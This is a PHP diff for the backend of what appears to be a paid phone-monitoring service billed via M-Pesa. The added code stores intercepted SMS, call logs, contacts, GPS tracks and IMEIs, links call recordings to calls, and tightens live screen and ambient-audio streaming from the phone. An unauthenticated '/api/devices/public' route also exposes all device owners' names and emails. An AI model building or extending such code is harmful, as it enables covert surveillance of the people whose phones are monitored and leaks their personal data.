@@ -54,14 +54,24 @@ function support_ready(array $device): bool {
     return !empty($device['consent_accepted']) && device_is_online($device);
 }
 
+function monthly_subscription_amount_mzn(): int {
+    return 800;
+}
+
 function normalize_device(array $row): array {
     $row['deviceId'] = $row['device_id'] ?? null;
     $row['owner'] = $row['owner_user_id'] ?? null;
+    $row['ownerUserId'] = $row['owner_user_id'] ?? null;
+    $row['ownerDisplay'] = trim((string)($row['owner_name'] ?? $row['owner_email'] ?? $row['owner_user_id'] ?? '')) ?: null;
+    $row['imei'] = $row['imei'] ?? null;
+    $row['model'] = $row['model'] ?? ($row['name'] ?? null);
     $row['lastSeen'] = $row['last_seen'] ?? null;
     $row['consentAccepted'] = isset($row['consent_accepted']) ? (bool) $row['consent_accepted'] : null;
     $row['consentTs'] = $row['consent_ts'] ?? null;
     $row['consentTextVersion'] = $row['consent_text_version'] ?? null;
     $row['createdAt'] = $row['created_at'] ?? null;
+    $row['subscriptionUntil'] = $row['subscription_until'] ?? null;
+    $row['subscriptionStatus'] = $row['subscription_status'] ?? (($row['owner_active'] ?? null) ? 'Ativa' : 'Sem subscrição');
     $row['isOnline'] = device_is_online($row);
     $row['supportReady'] = support_ready($row);
     return $row;
@@ -224,28 +234,224 @@ function latest_metric_summary(string $deviceId, string $metricType): ?array {
 
 
 function support_session_live_state(array $session, array $user): array {
-    $st = db()->prepare("SELECT m.file_id as fileId, m.filename, m.content_type as contentType, m.upload_date as uploadDate, m.checksum, m.device_id as deviceId, m.storage_path as storagePath FROM media m JOIN media_metadata mm ON mm.file_id = m.file_id WHERE mm.support_session_id = ? ORDER BY m.upload_date DESC LIMIT 20");
+    $st = db()->prepare("SELECT m.file_id as fileId, m.filename, m.content_type as contentType, m.upload_date as uploadDate, m.checksum, m.device_id as deviceId, m.storage_path as storagePath
+        FROM media m
+        JOIN media_metadata mm ON mm.file_id = m.file_id
+        WHERE mm.support_session_id = ?
+        ORDER BY COALESCE(mm.segment_started_at, m.upload_date) DESC, m.upload_date DESC
+        LIMIT 60");
     $st->execute([$session['session_id'] ?? $session['sessionId'] ?? null]);
     $rows = $st->fetchAll();
 
-    $screenFrame = null;
+    $screenFrames = [];
     $audioSegments = [];
     foreach ($rows as $row) {
         $formatted = format_media_row($row, $user);
-        if (($formatted['captureKind'] ?? null) === 'screen' && $screenFrame === null) {
-            $screenFrame = $formatted;
+        if (in_array((string)($formatted['captureKind'] ?? ''), ['screen', 'screen_video'], true) && count($screenFrames) < 12) {
+            $screenFrames[] = $formatted;
             continue;
         }
-        if (($formatted['captureKind'] ?? null) === 'ambient_audio' && count($audioSegments) < 5) {
+        if (($formatted['captureKind'] ?? null) === 'ambient_audio' && count($audioSegments) < 20) {
             $audioSegments[] = $formatted;
         }
     }
+    $screenFrames = array_reverse($screenFrames);
+    $audioSegments = array_reverse($audioSegments);
+    $screenFrame = $screenFrames ? end($screenFrames) : null;
 
     return [
         'screenFrame' => $screenFrame,
+        'screenFrames' => $screenFrames,
         'audioSegments' => $audioSegments,
-        'updatedAt' => $screenFrame['uploadDate'] ?? ($audioSegments[0]['uploadDate'] ?? null),
+        'updatedAt' => $screenFrame['uploadDate'] ?? ($audioSegments ? end($audioSegments)['uploadDate'] : null),
     ];
+}
+
+function device_query_sql(string $whereSql = '1=1'): string {
+    return "SELECT d.*, u.email AS owner_email, u.name AS owner_name, u.active AS owner_active,
+            latest.latest_payment_at,
+            CASE
+                WHEN latest.latest_payment_at IS NULL THEN NULL
+                ELSE DATE_ADD(latest.latest_payment_at, INTERVAL 30 DAY)
+            END AS subscription_until,
+            CASE
+                WHEN latest.latest_payment_at IS NULL THEN 'Sem subscrição'
+                WHEN DATE_ADD(latest.latest_payment_at, INTERVAL 30 DAY) >= NOW() THEN 'Ativa'
+                ELSE 'Expirada'
+            END AS subscription_status
+        FROM devices d
+        LEFT JOIN users u ON u.id = d.owner_user_id
+        LEFT JOIN (
+            SELECT user_id, MAX(COALESCE(processed_at, created_at)) AS latest_payment_at
+            FROM payments
+            WHERE status = 'completed'
+            GROUP BY user_id
+        ) latest ON latest.user_id = d.owner_user_id
+        WHERE {$whereSql}
+        ORDER BY d.last_seen DESC";
+}
+
+function recent_call_recordings_for_device(string $deviceId, array $user): array {
+    $st = db()->prepare("SELECT m.file_id as fileId, m.filename, m.content_type as contentType, m.upload_date as uploadDate, m.checksum, m.device_id as deviceId, m.storage_path as storagePath
+        FROM media m
+        LEFT JOIN media_metadata mm ON mm.file_id = m.file_id
+        WHERE m.device_id = ?
+          AND (
+            m.filename LIKE 'call_%'
+            OR mm.capture_kind = 'call_audio'
+            OR mm.capture_mode = 'call_recording'
+          )
+        ORDER BY m.upload_date DESC
+        LIMIT 120");
+    $st->execute([$deviceId]);
+    return array_map(fn ($row) => format_media_row($row, $user), $st->fetchAll());
+}
+
+function enrich_call_items(array $items, string $deviceId, array $user): array {
+    $recordings = recent_call_recordings_for_device($deviceId, $user);
+    $usedRecordingIds = [];
+
+    foreach ($items as &$item) {
+        $payload = is_array($item['payload'] ?? null) ? $item['payload'] : [];
+        $call = is_array($payload['payload'] ?? null) ? $payload['payload'] : $payload;
+        $item['call'] = [
+            'number' => $call['number'] ?? null,
+            'direction' => $call['direction'] ?? ($call['typeLabel'] ?? null),
+            'duration' => $call['duration'] ?? null,
+            'contactName' => $call['contactName'] ?? null,
+            'ts' => $call['ts'] ?? $item['ts'] ?? null,
+        ];
+
+        $callTs = strtotime((string)($item['call']['ts'] ?? $item['ts'] ?? ''));
+        if ($callTs === false) continue;
+
+        foreach ($recordings as $recording) {
+            if (in_array((string)$recording['fileId'], $usedRecordingIds, true)) continue;
+            $uploadTs = strtotime((string)($recording['uploadDate'] ?? ''));
+            if ($uploadTs === false) continue;
+            if (abs($uploadTs - $callTs) > 900) continue;
+
+            $item['call']['recording'] = [
+                'fileId' => $recording['fileId'] ?? null,
+                'filename' => $recording['filename'] ?? null,
+                'previewUrl' => $recording['previewUrl'] ?? null,
+                'downloadUrl' => $recording['downloadUrl'] ?? null,
+                'uploadDate' => $recording['uploadDate'] ?? null,
+            ];
+            $usedRecordingIds[] = (string)$recording['fileId'];
+            break;
+        }
+    }
+    unset($item);
+
+    return $items;
+}
+
+function persist_device_snapshot(string $deviceId, array $payload): void {
+    $device = is_array($payload['device'] ?? null) ? $payload['device'] : $payload;
+    $model = trim((string)($device['model'] ?? ''));
+    $manufacturer = trim((string)($device['manufacturer'] ?? ''));
+    $friendlyName = trim((string)($device['name'] ?? ($manufacturer !== '' || $model !== '' ? trim($manufacturer . ' ' . $model) : '')));
+    $imei = trim((string)($device['imei'] ?? ''));
+
+    if ($friendlyName === '' && $model === '' && $manufacturer === '' && $imei === '') {
+        return;
+    }
+
+    $up = db()->prepare('UPDATE devices SET name = COALESCE(NULLIF(?, ""), name), model = COALESCE(NULLIF(?, ""), model), manufacturer = COALESCE(NULLIF(?, ""), manufacturer), imei = COALESCE(NULLIF(?, ""), imei) WHERE device_id = ?');
+    $up->execute([$friendlyName, $model, $manufacturer, $imei, $deviceId]);
+}
+
+function persist_location_event(string $deviceId, array $payload): void {
+    $location = is_array($payload['location'] ?? null) ? $payload['location'] : [];
+    $lat = isset($location['lat']) ? (float)$location['lat'] : null;
+    $lon = isset($location['lon']) ? (float)$location['lon'] : null;
+    if ($lat === null || $lon === null) return;
+    $observedAt = json_datetime_from_millis($payload['ts'] ?? null) ?: date('Y-m-d H:i:s');
+    $ins = db()->prepare('INSERT INTO device_locations(device_id, lat, lon, accuracy, observed_at) VALUES(?,?,?,?,?)');
+    $ins->execute([$deviceId, $lat, $lon, isset($location['accuracy']) ? (float)$location['accuracy'] : null, $observedAt]);
+}
+
+function persist_sms_event(string $deviceId, array $payload): void {
+    $observedAt = json_datetime_from_millis($payload['ts'] ?? null) ?: date('Y-m-d H:i:s');
+    $ins = db()->prepare('INSERT INTO device_messages(device_id, sender, body, observed_at) VALUES(?,?,?,?) ON DUPLICATE KEY UPDATE body = VALUES(body)');
+    $ins->execute([$deviceId, $payload['from'] ?? null, $payload['body'] ?? null, $observedAt]);
+}
+
+function persist_call_event(string $deviceId, array $payload): void {
+    $observedAt = json_datetime_from_millis($payload['ts'] ?? null) ?: date('Y-m-d H:i:s');
+    $ins = db()->prepare('INSERT INTO device_calls(device_id, number, contact_name, direction, duration_seconds, observed_at) VALUES(?,?,?,?,?,?) ON DUPLICATE KEY UPDATE contact_name = COALESCE(VALUES(contact_name), contact_name), direction = COALESCE(VALUES(direction), direction)');
+    $ins->execute([
+        $deviceId,
+        $payload['number'] ?? null,
+        $payload['contactName'] ?? null,
+        $payload['direction'] ?? ($payload['typeLabel'] ?? null),
+        isset($payload['duration']) ? (int)$payload['duration'] : null,
+        $observedAt,
+    ]);
+}
+
+function persist_contact_event(string $deviceId, array $payload): void {
+    $phone = trim((string)($payload['phoneNumber'] ?? $payload['number'] ?? ''));
+    $email = trim((string)($payload['email'] ?? ''));
+    $name = trim((string)($payload['displayName'] ?? $payload['name'] ?? ''));
+    $contactKey = trim((string)($payload['contactKey'] ?? ($phone !== '' ? $phone : ($email !== '' ? $email : $name))));
+    if ($contactKey === '') return;
+    $observedAt = json_datetime_from_millis($payload['ts'] ?? null) ?: date('Y-m-d H:i:s');
+    $ins = db()->prepare('INSERT INTO device_contacts(device_id, contact_key, display_name, phone_number, email, updated_at) VALUES(?,?,?,?,?,?) ON DUPLICATE KEY UPDATE display_name = VALUES(display_name), phone_number = VALUES(phone_number), email = VALUES(email), updated_at = VALUES(updated_at)');
+    $ins->execute([$deviceId, $contactKey, $name !== '' ? $name : null, $phone !== '' ? $phone : null, $email !== '' ? $email : null, $observedAt]);
+}
+
+function persistent_sms_items(string $deviceId): array {
+    $st = db()->prepare('SELECT sender, body, observed_at FROM device_messages WHERE device_id = ? ORDER BY observed_at DESC LIMIT 500');
+    $st->execute([$deviceId]);
+    return array_map(static function (array $row): array {
+        return [
+            'ts' => $row['observed_at'],
+            'payload' => [
+                'from' => $row['sender'],
+                'body' => $row['body'],
+                'ts' => $row['observed_at'],
+            ],
+        ];
+    }, $st->fetchAll());
+}
+
+function persistent_location_items(string $deviceId): array {
+    $st = db()->prepare('SELECT lat, lon, accuracy, observed_at FROM device_locations WHERE device_id = ? ORDER BY observed_at DESC LIMIT 1000');
+    $st->execute([$deviceId]);
+    return array_map(static function (array $row): array {
+        return [
+            'ts' => $row['observed_at'],
+            'payload' => [
+                'location' => [
+                    'lat' => (float)$row['lat'],
+                    'lon' => (float)$row['lon'],
+                    'accuracy' => $row['accuracy'] !== null ? (float)$row['accuracy'] : null,
+                ],
+                'ts' => $row['observed_at'],
+            ],
+        ];
+    }, $st->fetchAll());
+}
+
+function persistent_call_items(string $deviceId, array $user): array {
+    $st = db()->prepare('SELECT number, contact_name, direction, duration_seconds, observed_at FROM device_calls WHERE device_id = ? ORDER BY observed_at DESC LIMIT 500');
+    $st->execute([$deviceId]);
+    $items = array_map(static function (array $row): array {
+        return [
+            'ts' => $row['observed_at'],
+            'payload' => [
+                'number' => $row['number'],
+                'contactName' => $row['contact_name'],
+                'direction' => $row['direction'],
+                'duration' => $row['duration_seconds'] !== null ? (int)$row['duration_seconds'] : null,
+                'ts' => $row['observed_at'],
+            ],
+        ];
+    }, $st->fetchAll());
+
+    return enrich_call_items($items, $deviceId, $user);
 }
 
 function device_observability_summary(string $deviceId): array {
@@ -493,20 +699,55 @@ try {
     }
 
     // Devices
+    if ($method === 'GET' && $uri === '/api/admin/overview') {
+        require_admin();
+
+        $summary = [
+            'users' => (int)db()->query("SELECT COUNT(*) FROM users WHERE role = 'user'")->fetchColumn(),
+            'devices' => (int)db()->query('SELECT COUNT(*) FROM devices')->fetchColumn(),
+            'onlineDevices' => (int)db()->query('SELECT COUNT(*) FROM devices WHERE last_seen >= (NOW() - INTERVAL 5 MINUTE)')->fetchColumn(),
+            'activeSubscriptions' => (int)db()->query("SELECT COUNT(*) FROM (
+                SELECT user_id, MAX(COALESCE(processed_at, created_at)) AS latest_payment_at
+                FROM payments
+                WHERE status = 'completed'
+                GROUP BY user_id
+            ) latest WHERE DATE_ADD(latest.latest_payment_at, INTERVAL 30 DAY) >= NOW()")->fetchColumn(),
+            'monthlyRevenueMzn' => (int)db()->query("SELECT COUNT(*) * " . monthly_subscription_amount_mzn() . " FROM payments WHERE status = 'completed' AND created_at >= (NOW() - INTERVAL 30 DAY)")->fetchColumn(),
+        ];
+
+        $expiringSt = db()->query("SELECT d.device_id, COALESCE(d.name, 'Sem nome') AS model, DATE_ADD(latest.latest_payment_at, INTERVAL 30 DAY) AS subscription_until
+            FROM devices d
+            JOIN (
+                SELECT user_id, MAX(COALESCE(processed_at, created_at)) AS latest_payment_at
+                FROM payments
+                WHERE status = 'completed'
+                GROUP BY user_id
+            ) latest ON latest.user_id = d.owner_user_id
+            WHERE DATE_ADD(latest.latest_payment_at, INTERVAL 30 DAY) BETWEEN NOW() AND DATE_ADD(NOW(), INTERVAL 7 DAY)
+            ORDER BY subscription_until ASC
+            LIMIT 10");
+
+        json_response([
+            'ok' => true,
+            'summary' => $summary,
+            'expiringSoon' => $expiringSt->fetchAll(),
+        ]);
+    }
+
     if ($method === 'GET' && $uri === '/api/devices/public') {
-        $rows = array_map('normalize_device', db()->query('SELECT * FROM devices ORDER BY last_seen DESC')->fetchAll());
+        $rows = array_map('normalize_device', db()->query(device_query_sql())->fetchAll());
         json_response(['ok' => true, 'devices' => $rows]);
     }
 
     if ($method === 'GET' && $uri === '/api/devices') {
         require_admin();
-        $rows = array_map('normalize_device', db()->query('SELECT * FROM devices ORDER BY last_seen DESC')->fetchAll());
+        $rows = array_map('normalize_device', db()->query(device_query_sql())->fetchAll());
         json_response(['ok' => true, 'devices' => $rows]);
     }
 
     if ($method === 'GET' && $uri === '/api/devices/my') {
         $u = auth_user();
-        $st = db()->prepare('SELECT * FROM devices WHERE owner_user_id = ? ORDER BY last_seen DESC');
+        $st = db()->prepare(device_query_sql('d.owner_user_id = ?'));
         $st->execute([$u['id']]);
         json_response(['ok' => true, 'devices' => array_map('normalize_device', $st->fetchAll())]);
     }
@@ -551,7 +792,9 @@ try {
 
     if ($method === 'GET' && ($m = route_match('/api/devices/:deviceId', $uri))) {
         $u = auth_user();
-        $d = find_device($m['deviceId']);
+        $st = db()->prepare(device_query_sql('d.device_id = ?') . ' LIMIT 1');
+        $st->execute([$m['deviceId']]);
+        $d = $st->fetch();
         if (!$d) json_response(['ok' => false, 'error' => 'not_found'], 404);
         if (!can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
         json_response(['ok' => true, 'device' => normalize_device($d)]);
@@ -626,9 +869,10 @@ try {
         $normalized = $session ? normalize_support_session($session) : null;
         if ($normalized) {
             $normalized['stream'] = [
-                'mode' => ($normalized['requestType'] ?? null) === 'ambient_audio' ? 'audio_chunk' : 'screen_frame',
-                'pollIntervalMs' => 2500,
-                'segmentDurationMs' => ($normalized['requestType'] ?? null) === 'ambient_audio' ? 4000 : null,
+                'mode' => ($normalized['requestType'] ?? null) === 'ambient_audio' ? 'audio_sequence' : 'screen_sequence',
+                'pollIntervalMs' => 900,
+                'frameIntervalMs' => 220,
+                'segmentDurationMs' => ($normalized['requestType'] ?? null) === 'ambient_audio' ? 1200 : 350,
             ];
         }
         json_response(['ok' => true, 'session' => $normalized]);
@@ -676,6 +920,16 @@ try {
         json_response(['ok' => true, 'session' => $updated ? normalize_support_session($updated) : null]);
     }
 
+    if ($method === 'GET' && ($m = route_match('/api/devices/:deviceId/contacts', $uri))) {
+        $u = auth_user();
+        $d = find_device($m['deviceId']);
+        if (!$d) json_response(['ok' => false, 'error' => 'not_found'], 404);
+        if (!can_access_device($u, $d)) json_response(['ok' => false, 'error' => 'forbidden'], 403);
+        $st = db()->prepare('SELECT display_name, phone_number, email, updated_at FROM device_contacts WHERE device_id = ? ORDER BY COALESCE(display_name, phone_number, email) ASC LIMIT 1000');
+        $st->execute([$m['deviceId']]);
+        json_response(['ok' => true, 'contacts' => $st->fetchAll()]);
+    }
+
     // Telemetry
     if ($method === 'POST' && ($m = route_match('/api/telemetry/:deviceId', $uri))) {
         $deviceId = $m['deviceId'];
@@ -702,6 +956,17 @@ try {
 
         $up = db()->prepare('INSERT INTO devices(device_id, last_seen) VALUES(?,?) ON DUPLICATE KEY UPDATE last_seen=VALUES(last_seen)');
         $up->execute([$deviceId, $ts]);
+        persist_device_snapshot($deviceId, $eventPayload);
+
+        if ($eventType === 'telemetry') {
+            persist_location_event($deviceId, $eventPayload);
+        } elseif ($eventType === 'sms') {
+            persist_sms_event($deviceId, $eventPayload);
+        } elseif ($eventType === 'call') {
+            persist_call_event($deviceId, $eventPayload);
+        } elseif ($eventType === 'contact') {
+            persist_contact_event($deviceId, $eventPayload);
+        }
 
         json_response(['ok' => true, 'id' => (string) db()->lastInsertId()]);
     }
@@ -726,13 +991,21 @@ try {
         if (!can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
 
         $type = $_GET['type'] ?? null;
-        $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT 500');
-        $st->execute([$m['deviceId']]);
+        if ($type === 'call') {
+            $items = persistent_call_items($m['deviceId'], $u);
+        } elseif ($type === 'sms') {
+            $items = persistent_sms_items($m['deviceId']);
+        } elseif ($type === 'telemetry') {
+            $items = persistent_location_items($m['deviceId']);
+        } else {
+            $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT 500');
+            $st->execute([$m['deviceId']]);
 
-        $items = [];
-        foreach ($st->fetchAll() as $r) {
-            $r['payload'] = safe_json_decode($r['payload']) ?? [];
-            if (!$type || (($r['payload']['type'] ?? null) === $type)) $items[] = $r;
+            $items = [];
+            foreach ($st->fetchAll() as $r) {
+                $r['payload'] = safe_json_decode($r['payload']) ?? [];
+                if (!$type || (($r['payload']['type'] ?? null) === $type)) $items[] = $r;
+            }
         }
 
         json_response(['ok' => true, 'total' => count($items), 'items' => $items]);
@@ -744,10 +1017,10 @@ try {
         if (!debito_is_configured()) json_response(['ok' => false, 'error' => 'debito_not_configured'], 503);
 
         $msisdn = preg_replace('/\D+/', '', (string)($body['msisdn'] ?? ''));
-        $amount = isset($body['amount']) ? (float)$body['amount'] : 0;
-        $referenceDescription = trim((string)($body['referenceDescription'] ?? $body['reference_description'] ?? 'Pagamento mensal'));
+        $amount = (float)monthly_subscription_amount_mzn();
+        $referenceDescription = trim((string)($body['referenceDescription'] ?? $body['reference_description'] ?? ('Pagamento mensal ' . monthly_subscription_amount_mzn() . ' MZN')));
         $note = trim((string)($body['note'] ?? ''));
-        if ($msisdn === '' || $amount < 1 || $referenceDescription === '') {
+        if ($msisdn === '' || $referenceDescription === '') {
             json_response(['ok' => false, 'error' => 'invalid_request'], 400);
         }
 
@@ -773,7 +1046,7 @@ try {
             $amount,
             'MZN',
             'mpesa',
-            $note !== '' ? $note : $referenceDescription,
+            $note !== '' ? $note : ('Pagamento mensal fixo de ' . monthly_subscription_amount_mzn() . ' MZN'),
             $localStatus,
             $msisdn,
             'debito',
